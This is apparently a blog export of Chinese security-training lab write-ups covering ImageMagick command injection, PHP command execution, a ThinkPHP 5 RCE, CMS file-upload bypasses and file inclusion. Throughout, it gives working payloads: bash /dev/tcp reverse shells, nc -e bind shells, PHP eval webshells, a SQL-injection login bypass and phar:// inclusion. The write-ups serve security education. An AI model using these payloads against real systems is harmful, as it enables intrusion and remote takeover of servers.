<p>实验链接：   <a href="http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f</a> </p>
<p>实验来源：合天网安实验室</p>
<p>实验目的：掌握ImageMagick命令执行漏洞产生的原因、利用方法以及修复方法</p>
<p>（2）实验操作</p>
<p>1）检查ImageMagick版本</p>
<p><img src="/assets/image-20200426165939722.png" alt="image-20200426165939722"></p>
<p>版本号为6.8.9.</p>
<p>2）漏洞测试</p>
<p>创建exploit.png,其内容为：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill 'url(https://example.com/image.jpg<span class="string">"|ls "</span>-la)'</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>

<p>利用convert生成新文件：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">convert</span> <span class="selector-tag">exploit</span><span class="selector-class">.png</span> <span class="selector-tag">out</span><span class="selector-class">.png</span></span><br></pre></td></tr></table></figure>

<p>可以发现成功执行了ls -a命令。证明存在命令执行漏洞。</p>
<p>3）漏洞利用</p>
<p>在另外台机器上，输入10.1.1.9访问目标服务器。先上传一个正常文件。</p>
<p><img src="/assets/image-20200426171311315.png" alt="image-20200426171311315"></p>
<p>发现是用的ImageMagick工具转换的。</p>
<p>先下载 nc，并在本地开启监听。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc.exe -nvlp <span class="number">12301</span></span><br></pre></td></tr></table></figure>



<p>上传一个可以弹shell的图片。图片内容：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill 'url(https://example.com/image.jpg<span class="string">"|bash -i &gt;&amp; /dev/tcp/10.1.1.2/12301 0&gt;&amp;1"</span>)'</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>

<p>上传后shell反弹成功。</p>
<p><img src="/assets/image-20200426172341563.png" alt="image-20200426172341563"></p>
<p>4）漏洞分析</p>
<p>ImageMagick对于每种格式文件都指定了一种委托，对于https形式的文件处理方式为：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="string">"wget"</span> -<span class="keyword">q</span> -O <span class="string">"%o"</span> <span class="string">"https:%M"</span></span><br></pre></td></tr></table></figure>

<p>而%M为输入的图片的url地址。由于是简单的字符串拼接，所以可以将引号闭合后通过管道符引入其他命令，形成了命令注入。</p>
<h2><span id="5web安全之命令执行漏洞理解">5.web安全之命令执行漏洞理解</span></h2><h3><span id="arce_ping">A.rce_ping</span></h3><p>（1）正常业务</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span></span><br></pre></td></tr></table></figure>

<p>有回显。</p>
<p>（2）fuzz测试。</p>
<p>首先抓包</p>
<p><img src="/assets/image-20200426133832110.png" alt="image-20200426133832110"></p>
<p>发现有两个参数，一个参数一个命令。可以猜想可能使用了一些命令执行函数。比如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="variable">$_POST</span>[<span class="string">'submit'</span>].<span class="string">" "</span>.<span class="variable">$_POST</span>[<span class="string">'ipaddress'</span>],<span class="variable">$return</span>);<span class="built_in">echo</span> <span class="variable">$return</span>;</span><br><span class="line"><span class="built_in">echo</span> system(<span class="variable">$_POST</span>[<span class="string">'submit'</span>].<span class="string">" "</span>.<span class="variable">$_POST</span>[<span class="string">'ipaddress'</span>]);</span><br><span class="line"><span class="built_in">echo</span> shell_exec(<span class="variable">$_POST</span>[<span class="string">'submit'</span>].<span class="string">" "</span>.<span class="variable">$_POST</span>[<span class="string">'ipaddress'</span>]);</span><br></pre></td></tr></table></figure>

<p>为了方便我们只对ipaddress这一选项进行fuzz测试。发现没有过滤。</p>
<p>（3）由于没有任何过滤所以直接写shell。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ipaddress</span>=127.0.0.1 | echo <span class="string">"&lt;?php @eval(<span class="variable">$_POST</span>['cmd']); ?&gt;"</span> &gt; shell.php &amp; <span class="attribute">submit</span>=ping</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426140144644.png" alt="image-20200426140144644"></p>
<p>尝试连接：</p>
<p><img src="/assets/image-20200426140329896.png" alt="image-20200426140329896"></p>
<p>发现失败，估计没有写的权限。</p>
<p>（4）尝试shell</p>
<p>a.正向shell</p>
<p>服务器</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ipaddress=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> | nc -lvp <span class="number">7777</span> -e /bin/bash</span><br></pre></td></tr></table></figure>

<p>本机</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc <span class="number">47.105</span><span class="number">.75</span><span class="number">.177</span> <span class="number">7777</span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426173713380.png" alt="image-20200426173713380"></p>
<p>正向shell成功。</p>
<p>b.反弹shell</p>
<p>本机(自己的服务器)：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc -lk <span class="number">7777</span></span><br></pre></td></tr></table></figure>

<p>远程服务器</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ipaddress=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> | bash -i &gt;&amp; /dev/tcp/xxxx/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>发现反弹不成功。</p>
<p>换台服务器尝试</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ipaddress=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> | bash -i &gt;&amp; /dev/tcp/xxx/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426174407176.png" alt="image-20200426174407176"></p>
<p>反弹shell成功。</p>
<h3><span id="brce_ping_2">B.rce_ping_2</span></h3><p>直接fuzz测试。</p>
<p><img src="/assets/image-20200426174750306.png" alt="image-20200426174750306"></p>
<p>发现<code>; &amp;&amp;</code>被过滤了。</p>
<p>直接正向shell测试。</p>
<p>服务器</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ipaddress=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> | nc -lvp <span class="number">7778</span> -e /bin/bash</span><br></pre></td></tr></table></figure>

<p>本机</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc <span class="number">47.105</span><span class="number">.75</span><span class="number">.177</span> <span class="number">7778</span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426175011326.png" alt="image-20200426175011326"></p>
<h3><span id="crce_ping_3">c.rce_ping_3</span></h3><p>同样fuzz测试。</p>
<p><img src="/assets/image-20200426175113764.png" alt="image-20200426175113764"></p>
<p>发现过滤了<code>&amp; ;</code>同第三关一样的测试即可。</p>
<h3><span id="drce_ping_4">D.rce_ping_4</span></h3><p>页面500</p>
<h3><span id="ecode">E.code</span></h3><p>规定三种能力。（1）列出目录（2）写shell (3)反弹shell</p>
<h4><span id="aarray_filter">a.array_filter</span></h4><p>array_filter函数原型array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</p>
<p>（1）列出目录</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">system</span>&amp;<span class="title">cmd</span>=<span class="title">ls</span></span></span><br></pre></td></tr></table></figure>

<p>成功列举目录</p>
<p>（2）写shell</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">func</span>=system&amp;echo <span class="string">"&lt;?php <span class="variable">$_POST</span>[pass]&gt; ?&gt;"</span> &gt; shell.php</span><br></pre></td></tr></table></figure>

<p>发现还是不能上传shell???这里想探究下。</p>
<p><img src="/assets/image-20200426181415386.png" alt="image-20200426181415386"></p>
<p>当前为apache用户，该文件夹为root创建，而others只有执行和读的权力。</p>
<p>(3)反弹shell。</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">system</span>&amp;<span class="title">cmd</span>=<span class="title">nc</span> -<span class="title">lvp</span> 7781 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426181654848.png" alt="image-20200426181654848"></p>
<p>反弹成功。</p>
<h4><span id="b-array_map">b. array_map</span></h4><p>array_map原型</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">array_map ( callable $callback ,<span class="built_in"> array </span>$array1 [,<span class="built_in"> array </span>$... ] )</span><br></pre></td></tr></table></figure>

<p>同样直接</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">exec</span>&amp;<span class="title">nc</span> -<span class="title">lvp</span> 7782 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426181922754.png" alt="image-20200426181922754"></p>
<h4><span id="cassert">c.assert</span></h4><p>assert原型</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">assert ( mixed $assertion [, <span class="built_in">string</span> $description ] )</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">shell<span class="constructor">_exec('<span class="params">nc</span> -<span class="params">lvp</span> 7783 -<span class="params">e</span> <span class="operator">/</span><span class="params">bin</span><span class="operator">/</span><span class="params">bash</span>')</span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426182118419.png" alt="image-20200426182118419"></p>
<h4><span id="dcall_user_func">d.call_user_func</span></h4><p>函数原型</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">call_user_func ( callable <span class="symbol">$</span>callback [, mixed <span class="symbol">$</span><span class="keyword">parameter</span> [, mixed <span class="comment">$... ]] )</span></span><br></pre></td></tr></table></figure>

<p>列举目录下文件：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">passthru</span>&amp;<span class="title">cmd</span>=<span class="title">ls</span></span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">passthru</span>&amp;<span class="title">cmd</span>=<span class="title">nc</span> -<span class="title">lvp</span> 7784 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426182340785.png" alt="image-20200426182340785"></p>
<h4><span id="ecreate_func">e.create_func</span></h4><p>create_function ( string $args , string $code )</p>
<p>同样payload:</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">passthru</span>&amp;<span class="title">cmd</span>=<span class="title">nc</span> -<span class="title">lvp</span> 7785 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>

<p>发现500了。。。。。。</p>
<h4><span id="feval">f.eval</span></h4><p>eval ( string $code )</p>
<p>直接shell。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">system</span><span class="params">(<span class="string">'nc -lvp 31321 -e /bin/bash'</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>连接发现失败。查手册发现eval里的代码必须为PHP代码，且以分号结尾。</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">system('nc -lvp <span class="number">3132</span>1 -e /bin/bash');</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426183223748.png" alt="image-20200426183223748"></p>
<p>成功反弹shell。</p>
<h4><span id="g-preg_replace">g preg_replace</span></h4><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, <span class="built_in">int</span> $limit = <span class="number">-1</span> [, <span class="built_in">int</span> &amp;$count ]] )</span><br></pre></td></tr></table></figure>

<p>直接cmd=phpinfo();</p>
<p><img src="/assets/image-20200426183515204.png" alt="image-20200426183515204"></p>
<p>反弹shell。</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">system('nc -lvp <span class="number">3132</span>2 -e /bin/bash');</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426183623281.png" alt="image-20200426183623281"></p>
<h4><span id="h-preg_replace2">h preg_replace2</span></h4><p>可以在双引号中使用</p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;$&#123;代码&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>来执行代码</p>
<p>只能列出目录，</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="link">http://47.105.75.177/owasp/vulnlab/exec/code/preg_replace_2.php?data=</span>[<span class="string">php</span>]&#123;$&#123;system(ls)&#125;&#125;[/php]</span><br></pre></td></tr></table></figure>



<p>正向shell出问题了。</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="link">http://47.105.75.177/owasp/vulnlab/exec/code/preg_replace_2.php?data=</span>[<span class="string">php</span>]&#123;$&#123;system(<span class="emphasis">'nc -lvp 31322 -e /bin/bash'</span>)&#125;&#125;[/php]</span><br></pre></td></tr></table></figure>



<h3><span id="fsys">F.sys</span></h3><p>由于题目较多，所以只进行简单的测试。</p>
<ul>
<li><p>com 500错误</p>
</li>
<li><p>exec ls</p>
</li>
<li><p>exec_l ls       发现会以数组的形式返回。</p>
</li>
<li><p>fyh ls</p>
</li>
<li><p>passthru  ls -a</p>
</li>
<li><p>popen ls</p>
</li>
<li><p>popen_l ls 没反应。此题不会。。。</p>
</li>
<li><p>shell_exec ls</p>
</li>
<li><p>system  ls  </p>
</li>
</ul>
<h3><span id="gthinkphp-v5框架漏洞">G.ThinkPHP V5框架漏洞</span></h3><p>首先用dirsearch扫描，</p>
<p><img src="/assets/image-20200426185546367.png" alt="image-20200426185546367"></p>
<p><img src="/assets/image-20200426185648640.png" alt="image-20200426185648640"></p>
<p>发现个关键文件README.md，wget下载后发现是5.0版本的ThinkPHP.当然也可以随便输入文件报错看版本：v5.0.22.</p>
<p>可以用云悉探测。</p>
<p>搜索历史漏洞。ThinkPHP命令执行漏洞，其影响范围：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ThinkPHP <span class="number">5.0</span>系列 &lt;<span class="number">5.0</span><span class="number">.23</span>，ThinkPHP <span class="number">5.1</span>系列&lt; <span class="number">5.1</span><span class="number">.31</span>，以及基于ThinkPHP5二次开发的CMS，如AdminLTE后台管理系统、Thinkcmf、ThinkSNS等。</span><br></pre></td></tr></table></figure>

<p>所以直接利用</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">index</span>.php?s=/<span class="keyword">index</span>/\think\request/<span class="keyword">cache</span>&amp;key=<span class="number">1</span>|phpinfo</span><br></pre></td></tr></table></figure>

<p>发现不成功。</p>
<p>利用网上的Poc</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=id</span><br></pre></td></tr></table></figure>

<p>利用成功</p>
<p><img src="/assets/image-20200426190132905.png" alt="image-20200426190132905"></p>
<p>正确写shell姿势</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="link">http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="string">0</span>]=system&amp;vars[1][]=echo ^&lt;?php @eval($<span class="emphasis">_GET["code"])?^&gt;&gt;shell.php</span></span><br></pre></td></tr></table></figure>

<p>尝试正向shell。</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=nc -lvp 31328 -e /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426190529727.png" alt="image-20200426190529727"></p>
<p>正向shell成功。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>合天培训_实验_文件上传考核</title>
    <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%80%83%E6%A0%B8/</url>
    <content><![CDATA[<p>本文主要讲解几个cms中出现的文件上传漏洞，以及对应的攻击方法。</p>
<a id="more"></a>

<h2><span id="1beecms">1.beecms</span></h2><p>首先后台登录</p>
<p>绕过登录方法：</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">用户名：admi' Un union ion Se%select%lect <span class="number">1</span>,'admin','<span class="number">9003</span>d1df22eb4d3820015070385194c8',<span class="number">4</span>,<span class="number">0</span> #</span><br><span class="line">密码：pwd</span><br></pre></td></tr></table></figure>

<p>在后台发现上传图片功能：</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">http://47.105.75.177/vulnlab/sqli/beecms/admin/admin_content.php?action=<span class="meta">add</span><span class="variable">&amp;id</span>=3<span class="variable">&amp;nav</span>=add_channel_product<span class="variable">&amp;admin_p_nav</span>=content<span class="variable">&amp;lang</span>=cn</span><br></pre></td></tr></table></figure>

<p>实际检测，发现是MIME白名单检测，所以Burp改包即可。</p>
<p>然后在图片管理中可以看到上传的文件的路径：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/vulnlab/</span>sqli<span class="regexp">/beecms/u</span>pload<span class="regexp">/img/</span><span class="number">202004201359505400</span>.php</span><br></pre></td></tr></table></figure>



<h2><span id="2fiyocms">2.fiyocms</span></h2><p>账户密码admin/admin888登录</p>
<p>找到上传文件的点：</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/47.105.75.177/vulnlab</span><span class="regexp">/upload/fiyocms</span><span class="regexp">/dapur/</span>?app=media&amp;<span class="keyword">type</span>=files</span><br></pre></td></tr></table></figure>

<p>但是上传按钮按不动。其他功能点也没有上传的，放弃。</p>
<p>老师讲了后发现themes下面有漏洞。</p>
<p>（1）任意文件读取</p>
<p>（2）任意文件上传</p>
<h2><span id="3phpok">3.phpok</span></h2><p>账户密码admin/admin登录</p>
<p>找到修改头像的点，发现只能上传图像。</p>
<p>上传一个后缀名改为gif的php代码。</p>
<p>然后改包：</p>
<p><img src="/assets/image-20200420145021307.png" alt="image-20200420145021307"></p>
<p>发现php被过滤了。</p>
<p>php fuzz测试。发现均被过滤了。</p>
<p>换思路，扫后台</p>
<p>扫出admin.php</p>
<p>登录发现不正确，应该用户表和管理员表是两张。</p>
<p>用户名：admin,密码： admin888 (利用其他网站的sql注入获得)</p>
<p>在工具，附件分类管理中gif,png,jpg后面再加个php。然后再文件上传即可。</p>
<p><img src="/assets/image-20200420154112973.png" alt="image-20200420154112973"></p>
<p>看burp包得到上传路径：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">res/<span class="number">202004</span>/<span class="number">20</span>/<span class="number">1555e119f</span>9dc2b1f.php</span><br></pre></td></tr></table></figure>

<p>访问资源即可：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/u</span>pload<span class="regexp">/phpok/</span>res<span class="regexp">/202004/</span><span class="number">20</span><span class="regexp">/1555e119f9dc2b1f.php</span></span><br></pre></td></tr></table></figure>

<p>为了方便其他同学做再改回去。</p>
<h2><span id="4geez">4.geez</span></h2><p>同样sql注入得到账户名密码：admin/admin445</p>
<p>发现进去就有上传文件的点。用fuzz模糊测试发现很好绕过。直接php.即可。</p>
<p>然后在主页再检查头像的地址：</p>
<p>得到上传文件：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">./upload/<span class="number">1</span>_dama1.php.</span><br></pre></td></tr></table></figure>

<p>访问：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/u</span>pload<span class="regexp">/denglu/u</span>pload<span class="regexp">/1_dama1.php.</span></span><br></pre></td></tr></table></figure>

<p>发现不能解析。</p>
<p>改为大小写绕过得到上传文件：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">./upload/<span class="number">1</span>_dama1.php</span><br></pre></td></tr></table></figure>

<p>访问：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/u</span>pload<span class="regexp">/denglu/u</span>pload<span class="regexp">/1_dama1.php</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>合天培训_实验_文件包含漏洞</title>
    <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>本文主要描述了文件包含漏洞实验，包括本地文件包含和远程文件包含，以及攻击方法。</p>
<a id="more"></a>

<h2><span id="本地文件包含">本地文件包含</span></h2><p>（1）提示include.php，访问include.php</p>
<p>（2）提示参数为file.利用file=include.php发现文件包含生效。</p>
<p>（3）尝试读取源代码</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=<span class="built_in">include</span>.php</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200421212856583-1588308709161.png" alt="image-20200421212856583"></p>
<p>base64解码后：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">Tips: the parameter is file! :) </span><br><span class="line"><span class="comment">&lt;!-- upload.php --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    @$file = $_GET[<span class="string">"file"</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (preg_match(<span class="string">'/http|data|ftp|input|%00/i'</span>, $file) || strstr($file,<span class="string">".."</span>) !== <span class="keyword">FALSE</span> || strlen($file)&gt;=<span class="number">70</span>)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt; error! &lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">include</span>($file);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>



<p>可以看到有后名单机制，包括http,data,ftp,input，而且是大小写不敏感。</p>
<p>（4）注意到注释中有upload.php。访问upload.php。发现可以文件上传（这里也可以用fuzz来找到upload.php）。</p>
<p>上传一个一句话木马post.php。发现上传失败</p>
<p>因为有文件包含漏洞，所以只要不是文件内容检测都能绕过，将post.php改为post.png.</p>
<p>上传成功：</p>
<p><img src="/assets/image-20200421225912301-1588308709163.png" alt="image-20200421225912301"></p>
<p>接下来进行文件包含。</p>
<p> <a href="http://47.105.75.177/vulnlab/include/1/include.php?file=./upload/post.png" target="_blank" rel="noopener">http://47.105.75.177/vulnlab/include/1/include.php?file=./upload/post.png</a> </p>
<p>利用菜刀连接即可。</p>
<p><img src="/assets/image-20200421230943902-1588308709163.png" alt="image-20200421230943902"></p>
<h2><span id="远程文件包含">远程文件包含</span></h2><p>（1）参数有file,提示php文件。代表只输入文件名就可以。</p>
<p>猜测代码：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'file'</span>].<span class="string">"php"</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>

<p>（2）读源码</p>
<p>file=php://filter/convert.base64-encode/resource=include</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">Tips:  </span><br><span class="line"><span class="comment">&lt;!-- upload.php --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    @$file = $_GET[<span class="string">"file"</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (preg_match(<span class="string">'/http|data|ftp|input|%00/i'</span>, $file) || strstr($file,<span class="string">".."</span>) !== <span class="keyword">FALSE</span> || strlen($file)&gt;=<span class="number">70</span>)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt; error! &lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">include</span>($file.<span class="string">'.php'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>题目要求phar，现在上传一个zip文件。</p>
<p><img src="/assets/image-20200421231446262-1588308709163.png" alt="image-20200421231446262"></p>
<p>发现不能上传zip。抓包看下是基于什么机制过滤的。</p>
<p>发现Mime类型不行。加点大小写什么的都不行。文件上传这个点做的比较严格。但是因为有文件包含漏洞，所以我的zip后缀改为任意的都行，比如改为jpg</p>
<p><img src="/assets/image-20200421232107205-1588308709164.png" alt="image-20200421232107205"></p>
<p>然后利用phar协议访问zip中的post.php</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/i</span>nclude<span class="regexp">/2/i</span>nclude.php?file=phar:<span class="regexp">//u</span>pload<span class="regexp">/webshell.jpg/</span>post.php</span><br></pre></td></tr></table></figure>

<p>用菜刀连接尝试,发现连接失败。</p>
<p>看了下路径不对，第二道题和第一道题不是在同一个路径下，改一下路径：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/i</span>nclude<span class="regexp">/2/i</span>nclude.php?file=phar:<span class="regexp">//</span>..<span class="regexp">/1/u</span>pload<span class="regexp">/webshell.jpg/</span>post.php</span><br></pre></td></tr></table></figure>

<p>发现报错error。</p>
<p>再想一下，不仅忘记去掉后缀名php了，而且不支持..</p>
<p>尝试使用绝对路径</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/i</span>nclude<span class="regexp">/2/i</span>nclude.php?file=phar:<span class="regexp">//</span><span class="regexp">/var/</span>www<span class="regexp">/html/</span>vulnlab<span class="regexp">/include/</span><span class="number">1</span><span class="regexp">/upload/</span>webshell.jpg<span class="regexp">/post</span></span><br></pre></td></tr></table></figure>

<p>菜刀连接，成功连接</p>
<p><img src="/assets/image-20200421233702677-1588308709164.png" alt="image-20200421233702677"></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>合天培训_实验_web安全之HTTP头部字段理解</title>
    <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_web%E5%AE%89%E5%85%A8%E4%B9%8BHTTP%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<p>本文主要是讲解http头部字段实验，实验的目的是加深对http请求头的理解。</p>
<a id="more"></a>

